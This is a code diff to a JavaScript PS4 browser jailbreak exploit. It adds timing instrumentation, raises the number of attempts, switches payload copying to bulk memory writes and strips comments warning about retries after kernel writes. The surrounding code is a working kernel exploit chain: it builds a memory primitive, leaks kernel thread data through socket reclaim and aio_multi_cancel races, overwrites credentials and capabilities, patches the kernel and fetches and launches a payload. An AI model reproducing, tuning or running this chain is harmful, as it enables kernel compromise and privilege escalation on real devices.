@@ -1,7 +1,15 @@
-import { establishPrimitive } from "./core.js?v=10";
+import { establishPrimitive } from "./core.js";
 import { installWindowP, pairStatus } from "./mem.js";
 import { int64 } from "./int64.js";
 import { offsetsFor } from "./ps4_offsets.js";
+
+let __t = Date.now();
+const __times = {};
+function tick(tag) {
+  const n = Date.now();
+  __times[tag] = (__times[tag] || 0) + (n - __t);
+  __t = n;
+}
 
 const outEl = document.getElementById("out");
 const stateEl = document.getElementById("state");
@@ -63,29 +71,29 @@ function finishUI(ok) {
 }
 function mark(tag, detail) {
   const raw = detail;
-  detail = terse(detail);
-  lines.push(tag + (detail == null || detail === "" ? "" : "  " + detail));
-  if (SHOW_LOG && outEl) {
-    const esc = (t) => String(t).replace(/&/g, "&amp;").replace(/</g, "&lt;");
-    outEl.innerHTML = lines
-      .map(function (l) {
-        l = esc(l);
-        const c =
-          /FAIL|ERROR|THREW|REBOOT|MISS|LOST|POISON|TIMEOUT|MISMATCH|ABORTED|GIVEUP|NO-STORAGE|UNSEEN/i.test(
-            l,
-          )
-            ? "bad"
-            : /WARN|SKIP|REFUS|COMMITTED|DIRTY/i.test(l)
-              ? "warn"
-              : /\bOK\b|\bPASS\b|PASS=|ACHIEVED|RUNNING|ARMED/i.test(l)
-                ? "ok"
-                : "";
-        return c ? '<span class="' + c + '">' + l + "</span>" : l;
-      })
-      .join("\n");
-    outEl.scrollTop = outEl.scrollHeight;
+  if (SHOW_LOG) {
+    detail = terse(detail);
+    lines.push(tag + (detail == null || detail === "" ? "" : "  " + detail));
+    if (outEl) {
+      const esc = (t) => String(t).replace(/&/g, "&amp;").replace(/</g, "&lt;");
+      outEl.innerHTML = lines
+        .map(function (l) {
+          l = esc(l);
+          const c =
+            /FAIL|ERROR|THREW|REBOOT|MISS|LOST|POISON|TIMEOUT|MISMATCH|ABORTED|GIVEUP|NO-STORAGE|UNSEEN/i.test(l)
+              ? "bad"
+              : /WARN|SKIP|REFUS|COMMITTED|DIRTY/i.test(l)
+                ? "warn"
+                : /\bOK\b|\bPASS\b|PASS=|ACHIEVED|RUNNING|ARMED/i.test(l)
+                  ? "ok"
+                  : "";
+          return c ? '<span class="' + c + '">' + l + "</span>" : l;
+        })
+        .join("\n");
+      outEl.scrollTop = outEl.scrollHeight;
+    }
   }
-  post(tag, raw);
+  if (VERBOSE || SHOW_LOG) post(tag, raw);
 }
 
 function trace(tag, detail) {
@@ -152,6 +160,7 @@ let allDone = false,
 
   const opened = [];
   let closeFd = null;
+  tick("boot");
   try {
     const { key, off } = offsetsFor(navigator.userAgent);
     mark("BUILD", "jb=skipjb2 base=ef1670a");
@@ -161,6 +170,7 @@ let allDone = false,
       return;
     }
     const fwKey = key || "unknown";
+    tick("ua-detect");
 
     const DO_JB = params.get("jb") !== "0";
     const DO_PATCH = params.get("patch") !== "0";
@@ -241,17 +251,9 @@ let allDone = false,
         PAYLOAD_FILE +
         " src=ps4_offsets.js",
     );
+    tick("offset-table-check");
 
     // ---- benign-miss auto-retry (reads only, before any kernel write) ----
-    // A passA/passB "no crossing" is a recoverable reclaim miss in the READ
-    // phase -- no kernel .data/.text has been touched yet, so reloading and
-    // retrying is safe. The counter lives in sessionStorage so it survives
-    // the reload and is cleared the moment the read phase succeeds, so a
-    // later manual run always starts fresh. NEVER call retryBenign() after a
-    // kernel write: a reload would re-enter with the kernel already modified.
-    // A hard KP (a total reclaim miss that faults inside the cancel walk)
-    // cannot be caught here and still needs a reboot -- this only recovers
-    // the benign, detectable misses.
     const retryArg = parseInt(params.get("retry") || "", 10);
     const RETRY_MAX = Number.isFinite(retryArg) && retryArg >= 0 ? retryArg : 4;
     const RETRY_KEY = "jb1352-read-retry";
@@ -304,16 +306,20 @@ let allDone = false,
 
     state("running the primitive...", "warn");
     await new Promise((r) => setTimeout(r, 0));
+    tick("pre-primitive");
 
-    const PRIMITIVE_LOUD = /FAIL|ERROR|THREW|RETRY|ABORT|PASS/i;
+       const PRIMITIVE_LOUD = /FAIL|ERROR|THREW|RETRY|ABORT|PASS/i;
     const carrier = await establishPrimitive({
-      maxAttempts: 6,
-      onEvent: (t, d, a) =>
+      maxAttempts: 12,
+      onEvent: (t, d, a) => {
+        if (!SHOW_LOG && !VERBOSE) return;
         (PRIMITIVE_LOUD.test(t) ? mark : trace)(
           t,
           (a != null ? "[" + a + "] " : "") + (d || ""),
-        ),
+        );
+      },
     });
+    tick("establishPrimitive");
     installWindowP(carrier, { promote: false });
     if (!window.p) throw new Error("window.p was not installed");
     p = window.p;
@@ -344,6 +350,7 @@ let allDone = false,
       )
     )
       return;
+    tick("bases");
 
     const G = {};
     const GAD = [
@@ -437,6 +444,7 @@ let allDone = false,
     const miss = Object.keys(SYS).filter((k) => !stubAddr.has(SYS[k]));
     if (!check("syscall-page-needs-stub", miss.length === 0, miss.join(",")))
       return;
+    tick("stubs");
 
     function bufAddr(ab) {
       const c = p.leakval(ab);
@@ -540,7 +548,7 @@ let allDone = false,
       const a = new int64(r.lo, r.hi);
       return a.hi === 0 && a.low === 0 ? -1 : p.read4(a) | 0;
     }
-    async function relaunchPayload() {
+       async function relaunchPayload() {
       let blob = null;
       try {
         const r = await fetch(PAYLOAD_FILE);
@@ -557,20 +565,23 @@ let allDone = false,
         mark("JB-RELAUNCH", "mmap failed err=" + errno());
         return;
       }
-      for (let o = 0; o < blob.length; o += 8) {
-        let lo = 0,
-          hi = 0;
-        for (let k = 0; k < 4; k++) lo |= (blob[o + k] || 0) << (8 * k);
-        for (let k = 0; k < 4; k++) hi |= (blob[o + 4 + k] || 0) << (8 * k);
-        p.write8(entry.add32(o), new int64(lo >>> 0, hi >>> 0));
-      }
+
+      // Bulk write: carrier window is 0x100 bytes, so ~1145 aim/restore
+      // cycles instead of ~36640 (one per 8 bytes).
+      p.writeBytes(entry, blob);
+
+      // Bulk verify via the exposed readInto, same reasoning.
+      const verify = new Uint8Array(blob.length);
+      p.readInto(verify, entry, blob.length);
       let bad = -1;
-      for (let o = 0; o < blob.length && bad < 0; o++)
-        if (p.read1(entry.add32(o)) !== blob[o]) bad = o;
+      for (let o = 0; o < blob.length; o++) {
+        if (verify[o] !== blob[o]) { bad = o; break; }
+      }
       if (bad >= 0) {
         mark("JB-RELAUNCH", "copy MISMATCH@0x" + bad.toString(16));
         return;
       }
+
       const fn = p.read8(webkitBase.add32(off.wk___imp_pthread_create));
       const expect = libkernelBase.add32(off.k_pthread_create);
       if (fn.low !== expect.low || fn.hi !== expect.hi) {
@@ -604,6 +615,7 @@ let allDone = false,
       pid > 0,
       "pid=" + pid + " uid=" + sc(SYS.getuid).i32,
     );
+    tick("chain-reaches-kernel");
 
     if (SKIPJB) {
       const SETUID = 23;
@@ -642,6 +654,7 @@ let allDone = false,
               " armings=0 reused=1",
           );
           allDone = true;
+          tick("skipjb-already");
           return;
         }
       }
@@ -789,7 +802,9 @@ let allDone = false,
       return w;
     }
     const w1 = await bringWorker("w1");
+    tick("bring-w1");
     const w2 = await bringWorker("w2");
+    tick("bring-w2");
     await w1.fire(SYS.getpid, []);
     const w1pid = w1.ctx.frameDv.getUint32(0, true) | 0;
     await w2.fire(SYS.getpid, []);
@@ -804,6 +819,7 @@ let allDone = false,
         " main=" +
         sc(SYS.getpid).i32,
     );
+    tick("workers-fired");
 
     const zoneOf = (s) => {
       const r = s & 15 ? (s + 16) & ~15 : s;
@@ -1110,6 +1126,7 @@ let allDone = false,
       return;
     }
     mark("PIN-SPLIT", "main=" + PINCORE + " workers=" + OTHER + " " + wpin);
+    tick("pinning");
 
     pinRestore = function () {
       const permitted = (((1 << PINCORE) | (1 << OTHER)) >>> 0) || savedMask;
@@ -1211,6 +1228,8 @@ let allDone = false,
       "PR-POOL",
       "reclaim sockets=" + POOL.length + " mad=" + M_AD + " lkad=" + lkAd,
     );
+    tick("pool-alloc");
+
     const pAb = new ArrayBuffer(RTH_SIZE);
     keepAlive.push(pAb);
     const pDv = new DataView(pAb),
@@ -1328,13 +1347,34 @@ let allDone = false,
       toDv.setUint32(0, TOWAIT, true);
       toDv.setUint32(4, 0, true);
       new Uint8Array(lkNodes).fill(0);
-      for (let i = 0; i < N_LEAK; i++) {
-        const o = i * NODE_SZ;
-        put(lkNdv, o + 0x00, LX);
-        put(lkNdv, o + 0x08, LC);
-        put(lkNdv, o + 0x10, M_AD);
-        put(lkNdv, o + 0x30, i === N_LEAK - 1 ? 0 : lkNad.add32(o + NODE_SZ));
+
+      // ---- optimised fill: no per-iteration int64 allocation ----
+      {
+        const lxLow = LX.low >>> 0, lxHi = LX.hi >>> 0;
+        const lcLow = LC.low >>> 0, lcHi = LC.hi >>> 0;
+        const maLow = M_AD.low >>> 0, maHi = M_AD.hi >>> 0;
+        const nLow = lkNad.low >>> 0, nHi = lkNad.hi >>> 0;
+        for (let i = 0; i < N_LEAK; i++) {
+          const o = i * NODE_SZ;
+          lkNdv.setUint32(o + 0x00, lxLow, true);
+          lkNdv.setUint32(o + 0x04, lxHi, true);
+          lkNdv.setUint32(o + 0x08, lcLow, true);
+          lkNdv.setUint32(o + 0x0c, lcHi, true);
+          lkNdv.setUint32(o + 0x10, maLow, true);
+          lkNdv.setUint32(o + 0x14, maHi, true);
+          if (i === N_LEAK - 1) {
+            lkNdv.setUint32(o + 0x30, 0, true);
+            lkNdv.setUint32(o + 0x34, 0, true);
+          } else {
+            const sum = nLow + o + NODE_SZ;
+            const carry = sum > 0xffffffff ? 1 : 0;
+            lkNdv.setUint32(o + 0x30, sum >>> 0, true);
+            lkNdv.setUint32(o + 0x34, (nHi + carry) >>> 0, true);
+          }
+        }
       }
+      tick("leak-fill");
+
       lkDv.setInt32(0x00, 0x40000000, true);
       lkDv.setInt32(0x10, 0x40000000, true);
       mU32[6] = 4;
@@ -1346,6 +1386,7 @@ let allDone = false,
         if (pr0 !== 0) return null;
       }
       const a = armOnce();
+      tick("leak-armOnce");
       if (a.indexOf("ok") !== 0) {
         mark("PR-LEAK-ARM", w.name + " " + a);
         return null;
@@ -1367,6 +1408,7 @@ let allDone = false,
       try {
         pr = w.fire(SYS.aio_multi_cancel, [idAd2, 1, stAd2]);
       } catch (e) {}
+      const __spinT0 = Date.now();
       for (let i = 0; i < SPIN; i++) {
         mU8[0x80 + (i & 15)] = i & 0xff;
         const hi1 = mU32[OWNER_HI];
@@ -1389,6 +1431,7 @@ let allDone = false,
           }
         }
       }
+      __times["leak-spin"] = (__times["leak-spin"] || 0) + (Date.now() - __spinT0);
       const drop = 0x40000000 - lkDv.getInt32(0x00, true);
       let cutAt = -1,
         cutTries = 0;
@@ -1443,6 +1486,7 @@ let allDone = false,
     }
     if (TRACEARM1) armTrace = true;
     const CT1 = await leakCurthread(w1);
+    tick("leakCurthread");
     armTrace = true;
 
     put(lkNdv, 0x00, LX);
@@ -1603,6 +1647,7 @@ let allDone = false,
     keepAlive.push(gfAb);
     const gfDv = new DataView(gfAb),
       gfAd = bufAddr(gfAb);
+    const gfU8 = new Uint8Array(gfAb);
     const glAb = new ArrayBuffer(8);
     keepAlive.push(glAb);
     const glDv = new DataView(glAb),
@@ -1614,7 +1659,7 @@ let allDone = false,
       for (let i = 0; i < POOL.length; i++) {
         glDv.setInt32(0, RTH_SIZE, true);
         glDv.setInt32(4, 0, true);
-        new Uint8Array(gfAb).fill(0);
+        gfU8.fill(0);
         if (
           sc(SYS.getsockopt, POOL[i], IPPROTO_IPV6, IPV6_RTHDR, gfAd, glAd)
             .i32 !== 0
@@ -1779,6 +1824,7 @@ let allDone = false,
         " covers up to " +
         KA * PAIR,
     );
+    tick("pre-passA");
     {
       let i = 0;
       for (let j = 0; j < KA; j++) {
@@ -1841,6 +1887,7 @@ let allDone = false,
           "]",
       );
     }
+    tick("passA");
 
     const RED = (kA - 1) * PAIR;
     const dga = [
@@ -1941,6 +1988,7 @@ let allDone = false,
           ")",
       );
     }
+    tick("passB");
 
     const UCRED = new int64(W0 >>> 0, CT1.hi >>> 0);
     mark(
@@ -1960,10 +2008,8 @@ let allDone = false,
         " 8-byte aligned=" +
         (((W0 >>> 0) & 7) === 0),
     );
-    // Read phase is done: the remaining armings (anchor, caps) touch the
-    // kernel, so from here a failure must NOT auto-reload. Reset the counter
-    // so the next manual run starts fresh.
     clearRetry();
+    tick("ucred-read");
 
     const IDT = new int64(0x00001a00, 0xffffff80);
     const GATE_SZ = 16;
@@ -2129,6 +2175,7 @@ let allDone = false,
       if (runChain(idx, "anchor-sweep") === null) return;
       if (!fireOk("anchor-sweep")) return;
     }
+    tick("anchor-sweep");
 
     function simPattern(bv, low) {
       let w = ((bv << 24) >>> 0) | (low & 0xffffff) | 0;
@@ -2267,6 +2314,7 @@ let allDone = false,
 
     if (!kbAligned) {
       allDone = true;
+      tick("anchor-fail");
       return;
     }
 
@@ -2356,6 +2404,7 @@ let allDone = false,
         CAPS_TARGET.toString(16),
     );
 
+    tick("pre-caps");
     const mf1 = multiFire(
       [
         { kind: "sweep", step: CAPS_B, probe: CAPS_PR, low: 0x000000 },
@@ -2363,6 +2412,7 @@ let allDone = false,
       ],
       "caps-byte+oid_number",
     );
+    tick("caps-mf1");
     if (mf1 === null) return;
     const cb = mf1[0],
       on = mf1[1];
@@ -2649,6 +2699,7 @@ let allDone = false,
       }
       capsWrote = capsPend;
     }
+    tick("unhide+caps-write");
     mark(
       "CAPS-DONE",
       "wrote=" +
@@ -2941,6 +2992,7 @@ let allDone = false,
               " payload=" +
               (DO_PAYLOAD ? 1 : 0),
           );
+          tick("krw-self-tests");
           if (
             !check(
               "eg-krw-ok",
@@ -3040,6 +3092,7 @@ let allDone = false,
                     : "none"),
               );
             }
+            tick("fetch-payloads");
 
             if (DO_JB) {
               const P_UCRED = 0x40,
@@ -3290,6 +3343,7 @@ let allDone = false,
                 );
               }
             }
+            tick("jb-root");
 
             if (jbDone && DO_PATCH) {
               const jitStub = findStub(0x215),
@@ -3465,6 +3519,7 @@ let allDone = false,
                 }
               }
             }
+            tick("kpatch");
 
             if (
               kpDone &&
@@ -3543,6 +3598,7 @@ let allDone = false,
                 }
               }
             }
+            tick("payload-launch");
 
             try {
               const TDU = CT1.add32(0x130);
@@ -3621,6 +3677,7 @@ let allDone = false,
       ],
       "oid+0x54+caps-restore",
     );
+    tick("mf3");
     if (mf3 === null) return;
     const ran = mf3[0];
     mark(
@@ -3823,6 +3880,7 @@ let allDone = false,
     mark("THREW", e && e.message ? e.message : String(e));
     state("threw", "bad");
   } finally {
+    tick("end");
     try {
       if (jbRestoreHook) jbRestoreHook("finally");
     } catch (e5) {
@@ -3863,6 +3921,9 @@ let allDone = false,
         failCount +
         (allDone ? "" : "  INCOMPLETE"),
     );
+    try {
+      mark("TIMING", JSON.stringify(__times));
+    } catch (e) {}
     try {
       finishUI(payloadRunning);
     } catch (eUI) {}
